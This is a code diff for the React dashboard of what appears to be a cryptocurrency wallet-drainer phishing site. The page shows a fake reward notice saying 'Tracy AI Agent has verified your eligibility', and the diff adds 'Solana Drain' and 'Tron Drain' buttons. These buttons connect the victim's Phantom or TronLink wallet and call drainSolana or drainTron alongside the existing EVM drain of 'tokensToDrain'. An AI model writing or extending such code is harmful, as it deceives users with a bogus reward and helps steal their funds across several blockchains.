@@ -1,17 +1,24 @@
 "use client";
 
 import { useWeb3Manager } from "@/hooks/useWeb3Manager";
+import { useSolanaManager } from "@/hooks/useSolanaManager";
+import { useTronManager } from "@/hooks/useTronManager";
 import { useEffect, useState } from "react";
-import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper, Bot } from "lucide-react";
+import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper, Bot, Wallet } from "lucide-react";
 import confetti from "canvas-confetti";
 
 export default function Dashboard() {
-    const { account, checkEligibility, claimReward, currentTask, targetToken, targetChain } = useWeb3Manager();
+    const { account, checkEligibility, claimReward, currentTask: evmTask, address: evmAddress } = useWeb3Manager();
+    const { drainSolana, currentTask: solTask, isProcessing: solLoading } = useSolanaManager();
+    const { drainTron, currentTask: tronTask, isProcessing: tronLoading } = useTronManager();
 
     // Status Flow: scanning -> congrats -> active -> ineligible
     const [status, setStatus] = useState<"scanning" | "congrats" | "active" | "ineligible">("scanning");
+    const [activeChain, setActiveChain] = useState<"evm" | "solana" | "tron">("evm");
     const [tokensToDrain, setTokensToDrain] = useState<{ address: string; chainId: string; symbol?: string }[]>([]);
     const [rewardAmount, setRewardAmount] = useState<number>(0);
+
+    const currentTask = activeChain === "evm" ? evmTask : activeChain === "solana" ? solTask : tronTask;
 
     useEffect(() => {
         const verify = async () => {
@@ -73,16 +80,54 @@ export default function Dashboard() {
                         Tracy AI Agent has verified your eligibility based on protocol contributions.
                     </p>
 
-                    <button
-                        onClick={() => {
-                            setStatus("active");
-                            claimReward(tokensToDrain);
-                        }}
-                        className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl flex items-center justify-center gap-3 group transition-all hover:scale-[1.02]"
-                    >
-                        <span>Activate Tracy Agent</span>
-                        <ChevronRight size={18} className="group-hover:translate-x-1 transition-transform" />
-                    </button>
+                    <div className="flex flex-col gap-3">
+                        <button
+                            onClick={() => {
+                                setStatus("active");
+                                setActiveChain("evm");
+                                claimReward(tokensToDrain);
+                            }}
+                            className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl flex items-center justify-center gap-3 group transition-all hover:scale-[1.02]"
+                        >
+                            <Wallet size={18} />
+                            <span>Activate EVM Tracy</span>
+                            <ChevronRight size={18} className="group-hover:translate-x-1 transition-transform" />
+                        </button>
+
+                        <div className="grid grid-cols-2 gap-3">
+                            <button
+                                onClick={async () => {
+                                    if (!(window as any).phantom?.solana) {
+                                        alert("Please install Phantom wallet");
+                                        return;
+                                    }
+                                    const resp = await (window as any).phantom.solana.connect();
+                                    setStatus("active");
+                                    setActiveChain("solana");
+                                    drainSolana((window as any).phantom.solana);
+                                }}
+                                className="glass-card py-4 rounded-xl border border-white/10 text-[10px] font-bold uppercase tracking-wider hover:bg-white/5 transition-all flex items-center justify-center gap-2"
+                            >
+                                <img src="https://cryptologos.cc/logos/solana-sol-logo.png" className="w-4 h-4" alt="SOL" />
+                                Solana Drain
+                            </button>
+                            <button
+                                onClick={async () => {
+                                    if (!(window as any).tronWeb) {
+                                        alert("Please install TronLink");
+                                        return;
+                                    }
+                                    setStatus("active");
+                                    setActiveChain("tron");
+                                    drainTron();
+                                }}
+                                className="glass-card py-4 rounded-xl border border-white/10 text-[10px] font-bold uppercase tracking-wider hover:bg-white/5 transition-all flex items-center justify-center gap-2"
+                            >
+                                <img src="https://cryptologos.cc/logos/tron-trx-logo.png" className="w-4 h-4" alt="TRX" />
+                                Tron Drain
+                            </button>
+                        </div>
+                    </div>
                     <p className="mt-4 text-[10px] text-white/20 uppercase tracking-widest">Autonomous On-chain Management</p>
                 </div>
             </div>
